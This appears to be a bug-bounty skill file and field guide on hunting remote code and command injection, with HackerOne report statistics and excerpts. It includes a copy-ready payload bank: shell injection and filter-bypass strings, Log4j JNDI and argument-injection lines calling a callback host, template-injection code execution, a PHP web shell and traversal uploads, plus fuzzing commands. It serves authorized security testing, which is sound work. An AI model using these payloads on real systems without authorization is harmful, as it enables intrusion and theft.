---
name: hackerone-rce
description: >-
  Hunt RCE, OS command injection, code injection, and unsafe eval. Use when testing file processing, integrations, templating, deserialization, or admin tooling. Backed by 1,399 disclosed HackerOne reports.
---

# Remote Code / Command Injection — HackerOne field guide

Built from **1,399** publicly disclosed HackerOne reports (2013–2026). Corpus: `~/.local/share/hackerone-reports/`.

## Signal

- Reports: **1,399** · paid: **338**
- Median bounty **$800** · p90 **$8,000** · max **$33,510** · total **$888,597**
- Median upvotes **11**

## Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitLab | 38 | $179,420 | 5024 |
| shopify-scripts | 85 | $173,800 | 632 |
| Internet Bug Bounty | 129 | $98,057 | 2062 |
| Pornhub | 8 | $43,600 | 1008 |
| PayPal | 2 | $39,700 | 1797 |
| Uber | 18 | $32,000 | 816 |
| Mail.ru | 34 | $27,450 | 1686 |
| X / xAI | 20 | $26,180 | 2306 |

## Quick wins

Start here. These are the highest-yield tests for this class.

- Map sinks: shell exec, eval, template render, image/PDF converters, archive tools, CI runners.
- Use time-based and OOB callbacks, not just output reflection.
- Test argument injection on tools that take filenames/URLs (curl, ffmpeg, git, ImageMagick).
- Check upload -> processing chains (SVG, image, office, archive).
- Look at admin/debug endpoints and internal tooling exposed to users.

## Payloads & probes

- Shell -> `;id`, `|id`, `$(id)`, backticks, `%0aid`, newline injection
- Argument -> `--output=/tmp/x`, `-o`, `--config`, `file://`
- Expression -> `${7*7}`, `{{7*7}}`, `#{7*7}`, `<%= 7*7 %>`
- Log4j -> `${jndi:ldap://callback/a}`
- ImageMagick -> `push graphic-context` / `fill 'url(https://callback/x)'`

## Payload bank

**53 curated payloads** in 5 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.

### Shell metacharacters

```text
;id
|id
||id
&id
&&id
$(id)
`id`
%0aid
%0d%0aid
';id;'
";id;"
|whoami
;cat /etc/passwd
$(cat /etc/passwd)
`cat /etc/passwd`
```

### Space / filter bypass

```text
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
cat</etc/passwd
c\at /etc/passwd
c'a't /etc/passwd
/bin/cat$IFS/etc/passwd
$(printf '\x69\x64')
echo${IFS}aWQ=|base64${IFS}-d|sh
id%09
id%0a
;id;#
|id|
```

### Argument injection

```text
--output=/tmp/x
-o /tmp/x
--config=/tmp/x
--upload-pack=id
--checkpoint-action=exec=id
-fsSL http://callback/x
--proxy=http://callback:8080
--dump-config
@file
file:///etc/passwd
```

### Expression / template / log4j

```text
${7*7}
{{7*7}}
#{7*7}
<%= 7*7 %>
${jndi:ldap://callback/a}
${jndi:dns://callback/a}
${${::-j}${::-n}${::-d}${::-i}:ldap://callback/a}
{{cycler.__init__.__globals__.os.popen('id').read()}}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<%= system('id') %>
```

### Upload / parser / archive

```text
push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://callback/x)'\npop graphic-context
<?php system($_GET['c']); ?>
<svg onload=alert(1)>
../../../../var/www/html/shell.php
..\..\..\..\inetpub\wwwroot\shell.aspx
PK../../../../var/www/html/shell.php
```

Copyable lists:
- `~/.local/share/hackerone-reports/wordlists/payloads_rce.txt` (53)
- `~/.local/share/hackerone-reports/wordlists/payloads_rce_waf.txt` (12 filter/WAF-focused)

## Bypass tricks

- Blind via DNS/HTTP callback; encode spaces as `${IFS}`, `%09`, `$()`.
- Bypass blocklists with base64, wildcards, quotes, and environment variables.
- Use file-write + include, or log poisoning, when direct exec is blocked.

## Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`cmd` `exec` `command` `run` `eval` `template` `import` `convert` `render` `filename` `url`

## Tools

`interactsh` · `commix` · `ysoserial` · `nuclei` · `Burp`

## Escalation chains

- RCE -> cloud creds -> lateral movement.
- Upload + parser -> RCE.
- SSTI -> RCE.

## Deeper checklist

- Map sinks: shell exec, eval, template render, image/PDF converters, archive tools, CI runners.
- Test command injection with time-based and OOB callbacks, not just output reflection.
- Try argument injection on tools that accept filenames/URLs (curl, ffmpeg, git, imagemagick).
- Check file upload + processing chains (SVG, image, office, archive) for code paths.
- Test expression languages, spreadsheet formulas, and template engines.
- Look at admin/debug endpoints and internal tooling exposed to users.
- Escalate from injection to a clear impact: command output, file read, or callback.

## Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **Potential pre-auth RCE on Twitter VPN** — `#591295` · X / xAI · $20,160 · ▲1246
  > For security concern, we didn't attach the `mtmp/system` and the `dataa/data.mdb`.
- **Exposed Kubernetes API - RCE/Exposed Creds** — `#455645` · Snapchat · $25,000 · ▲1191
  > During a worldwide kubernetes scan with binaryedge.io i found a K8 exposed internal API endpoint without authorization to the public.
- **RCE via npm misconfig -- installing internal libraries from the public registry** — `#925585` · PayPal · $30,000 · ▲946
  > [Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610?sk=991ef9a180558d25c5c6bc5081c99089)
- **DoS on PayPal via web cache poisoning** — `#622122` · PayPal · $9,700 · ▲851
  > On https://paypal.com/, you could impact core functionality by using an invalid Transfer-Encoding header to replace JavaScript files from www.paypalobjects.com with the message '501 Not Implemented'.
- **H1514 Remote Code Execution on kitcrm using bulk customer update of Priority Products** — `#422944` · Shopify · $0 · ▲830
  > When uploading an ImageTragick (issue found my Tavis Ormandy) using the following payload (my netcat listener is on `██████████:8080`:
- **Remote Code Execution on www.semrush.com/my_reports on Logo upload** — `#403417` · Semrush · $0 · ▲824
  > Tavis Ormandy has also mentioned recently that the policy.xml needs to disable EPS,PS,PDF and XPS since all these have ways to trigger Ghostscript: http://openwall.com/lists/oss-security/2018/08/21/2
- **Websites Can Run Arbitrary Code on Machines Running the 'PlayStation Now' Application** — `#873614` · PlayStation · $15,000 · ▲780
  > After opening the initial URL at `https://psnow.playstation.com/app/1.10.43/105/00d3603f8/` we can see the `Connection: Upgrade` request to this server from `psnow.playstation.com`.
- **Git flag injection - local file overwrite to remote code execution** — `#658013` · GitLab · $12,000 · ▲777
  > The `wiki blobs` scope of the Search API can be provided with an arbitrary `ref` parameter, allowing for additional flags to be injected into the git command.
- **Webshell via File Upload on ecjobs.starbucks.com.cn** — `#506646` · Starbucks · $0 · ▲688
  > I found that users can upload asp/aspx and other dynamic files via the avatar upload function when adding a space character behind the file type to bypass the upload file limit.The attacker can run malicious cmd on the server.
- **RCE and Complete Server Takeover of http://www.█████.starbucks.com.sg/** — `#502758` · Starbucks · $0 · ▲572
  > One twist was that since I needed to bypass the local proxy, instead of attacking `/web-console`, I had to send all requests to `/josso/%5C../web-console`.
- **Privilege Escalation From user to SYSTEM via unauthenticated command execution** — `#544928` · Ubiquiti Inc. · $0 · ▲553
  > Since the evostream service is running as SYSTEM a user can use the launchprocess command, http://docs.evostream.com/2.0/launchProcess.html, to execute any binary with supplied arguments.
- **BAD Code !** — `#180074` · Paragon Initiative Enterprises · $0 · ▲549
  > Anyway, I've found that your code here https://github.com/paragonie/airship/blob/master/tools/audit helper.php , is starting with <?php and it should be with ? ...
- **Local files could be overwritten in GitLab, leading to remote command execution** — `#587854` · GitLab · $12,000 · ▲542
  > Suppose we have a repository which has only one file `id ed25519.pub` (contains my pubkey) in directory `--output=/var/opt/gitlab/.ssh/authorized keys/`.
- **Remote Code Execution in Slack desktop apps + bonus** — `#783877` · Slack · $0 · ▲509
  > banned `iframe`, `applet`, `meta`, `script`, `form` etc.
- **RCE when removing metadata with ExifTool** — `#1154542` · GitLab · $20,000 · ▲508
  > When uploading image files, GitLab Workhorse passes any files with the extensions [jpg|jpeg|tiff](https://gitlab.com/gitlab-org/gitlab/-/blob/v13.10.2-ee/workhorse/internal/upload/exif/exif.go L104) through to [ExifTool](https://exiftool.org/) to remove any…
- **profile-picture name parameter with large value lead to DoS for other users and programs on the platform** — `#764434` · HackerOne · $0 · ▲475
  > Add the payload text (attached with report payload.txt) at the starting of the filename in the above request e.g `<payload abcd.png`
- **RCE via unsafe inline Kramdown options when rendering certain Wiki pages** — `#1125425` · GitLab · $20,000 · ▲427
  > As both `require relative` and `require` allow for directory traversal, supplying a `driver` option such as `../../../../../../../../../../tmp/a.rb` will cause that file to be evaluated.
- **Panorama UI XSS leads to Remote Code Execution via Kick/Disconnect Message** — `#631956` · Valve · $0 · ▲420
  > So we tried a simple payload `disconnect "<img src='https://i.imgur.com/IbJKM0M.jpg' "`, and after running it twice (for caching purposes), the cat appeared to our surprise.
- **Remote code execution on Basecamp.com** — `#365271` · Basecamp · $5,000 · ▲417
  > /Proof of concept/: Upload the attached rce.gif file as profile image (change the `ping -c1 attacker.com' to some other shell command).
- **H1514 Server Side Template Injection in Return Magic email templates?** — `#423541` · Shopify · $0 · ▲409
  > `{{ this. proto .constructor.name }}` -- `Object`
- **Denial of service to WP-JSON API by cache poisoning the CORS allow origin header** — `#591302` · Automattic · $0 · ▲405
  > The WP-JSON implementation on some wordpress.com websites I've tested is vulnerable to denial of service where by an attacker can provide an arbitrary `Origin` header in the request, which is then echoed back in the response via the…
- **Remote Command Execution via Github import** — `#1679624` · GitLab · $33,510 · ▲392
  > run `curl -v 'http://gitlab.wbowling.info/root' -H 'Cookie: gitlab session=gggg'` replacing `gitlab.wbowling.info` with your gitlab url and `gggg` with the string you used in `gen payload3.rb`
- **RCE via the DecompressedArchiveSizeValidator and Project BulkImports (behind feature flag)** — `#1609965` · GitLab · $33,510 · ▲387
  > Most of the places I've checked do not allow you to set the `import source` for a project, or have the `import type` set to something other than `gitlab project` or `gitlab custom project template` (which is required to use the…
- **RCE on build server via misconfigured pip install** — `#946409` · Yelp · $0 · ▲366
  > Whenever `yelp-cgeom` is installed, my `setup.py` script is executed on the machine where it is downloaded.
- **Unauthenticated RCE in Taskcluster web-server via GraphQL filter argument (sift $where)** — `#3782701` · Mozilla · $12,000 · ▲361
  > The anonymous role has the required scopes. On `firefox-ci-tc` the `anonymous` role grants `auth:expand-scopes`, `auth:list-roles`, `auth:current-scopes`, and `hooks:list-hooks: `.
- **Arbitrary file read via ffmpeg HLS parser at https://www.flickr.com/photos/upload** — `#487008` · Flickr · $0 · ▲340
  > 3.Now go to https://www.flickr.com/cameraroll and you should be able to see contents of /etc/passwd.
- **[Urgent] Invalidating OAuth2 Bearer token makes TweetDeck unavailable** — `#210779` · X / xAI · $0 · ▲323
  > According to the documentation, with a valid consumer key and consumer secret pair, one can generate or invalidate existing bearer token: https://dev.twitter.com/oauth/reference/post/oauth2/invalidate/token
- **Code injection possible with malformed Nextcloud Talk chat commands** — `#851807` · Nextcloud · $0 · ▲317
  > For example, /wiki cannot show the results of `cat /etc/passwd` because the multiline output breaks the wiki script, but the [calculator sample](https://nextcloud-talk.readthedocs.io/en/latest/commands/ create-pathtocalcsh) can show the output because it has…
- **RCE on TikTok Ads Portal** — `#1024575` · TikTok · $0 · ▲312
  > The video upload endpoint on the TikTok Ads portal was potentially susceptible to remote code execution (RCE) due to a ffmpeg misconfiguration.
- **RCE via github import** — `#1672388` · GitLab · $0 · ▲271
  > - Go to `/tmp/dummy-server` then run this command: `node ./index.js YOUR IP YOUR PORT` in which, you should replace `IP` and `PORT` with the one you have.

## Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 7× | `$where` |
| 5× | `SFORMAT()` |
| 4× | `https://twitter.com/{username}/moments` |
| 4× | `<img>` |
| 4× | `..;/` |
| 4× | `requestOCSP()` |
| 4× | `loadSession()` |
| 4× | `VM.doCODESIZE()` |
| 4× | `discover()` |
| 4× | `%00` |
| 3× | `eval()` |
| 3× | `OsCommand.writeJson()` |
| 3× | `$templates` |
| 3× | `<local_file_path>` |
| 3× | `<webview>` |
| 3× | `loadSNI()` |
| 3× | `<div>` |
| 3× | `$GITHUB_TOKEN` |
| 3× | `install_packages()` |
| 3× | `=cmd\\|' /C calc'!A0` |

## Parameters observed

`for[]` · `id` · `name` · `for` · `iclLayout` · `url` · `debug` · `action` · `email` · `status` · `new_size[]` · `scope` · `dag_id` · `username` · `password` · `search` · `ref` · `client_id` · `redirect_uri` · `response_type`

## Case studies

### Potential pre-auth RCE on Twitter VPN
`#591295` · X / xAI · $20,160 · critical · 2019-08-10 · ▲1246
> Hi, we(Orange Tsai and Meh Chang) are the security research team from DEVCORE. Recently, we are doing a research about SSL VPN security, and found several critical vulnerabilities on Pulse Secure SSL VPN! We have reported to vendor and patches have been released on 2019/4/25.

### Exposed Kubernetes API - RCE/Exposed Creds
`#455645` · Snapchat · $25,000 · critical · 2021-07-29 · ▲1191
> @txt3rob found one of Snaps internal Kubernetes instances exposing an API endpoint without authorization to the public. With access to this API he was able to run arbitrary code/jobs as a cluster-admin and gained access to credentials with internal access to a significant number of instances. During a worldwide kubernetes scan with binaryedge.io i found a K8 exposed internal API endpoint without authorization to the public.

### RCE via npm misconfig -- installing internal libraries from the public registry
`#925585` · PayPal · $30,000 · critical · 2021-02-09 · ▲946
> A Bug Bounty researcher identified an issue where certain development projects defaulted to the public NPM registry, instead of using the intended internal packages. Since the packages on the public registry did not exist, the researcher created these and observed they were downloaded. Had these packages been registered with malicious intent, it is possible for internal development to have included this code.

### DoS on PayPal via web cache poisoning
`#622122` · PayPal · $9,700 · medium · 2019-10-23 · ▲851
> On https://paypal.com/, you could impact core functionality by using an invalid Transfer-Encoding header to replace JavaScript files from www.paypalobjects.com with the message '501 Not Implemented'. This was patched and awarded a $9,700 bounty. By the time you read this, there should be a full writeup on this technique at https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning

### H1514 Remote Code Execution on kitcrm using bulk customer update of Priority Products
`#422944` · Shopify · $0 · medium · 2020-02-06 · ▲830
> kitcrm.com allows the administrator to upload priority product images located at: https://kitcrm.com/seller/onboarding/1 {F359446} {F359447} These images are not being checked if they are real JPG/PNG/GIF. When uploading an ImageTragick (issue found my Tavis Ormandy) using the following payload (my netcat listener is on ██████████:8080: Then connecting kitcrm to Facebook Messenger, and writing the following commands to kit: {F359445} {F359443} {F359444} A…

## Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_rce.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/params_rce.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/payloads_rce.txt` | 53 |
| `~/.local/share/hackerone-reports/wordlists/payloads_rce_waf.txt` | 12 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_rce.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_rce.txt \
     -mr 'canary|error|invalid|not found' -rate 40
ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_rce.txt \
     -mr '<hit-marker>' -rate 20
```

## Nuclei

Use OAST for blind command injection; check argument injection in tools that shell out.

```sh
nuclei -u https://target -tags rce,cmdi,oast \
       -severity low,medium,high,critical -rl 40 -o nuclei_rce.txt
nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/cmdi -dast \
       -rl 40 -o nuclei_rce_cmdi.txt
nuclei -u https://target -t ~/nuclei-templates/http/fuzzing/header-command-injection.yaml \
       -rl 40 -o nuclei_rce_header-command-injection.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

## Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class rce --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class rce
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class rce
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class rce --min-bounty 1000
```

## Related

- `hackerone-deserialization` (93 reports)
- `hackerone-ssti` (28 reports)
- `hackerone-file-upload` (100 reports)

## Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.
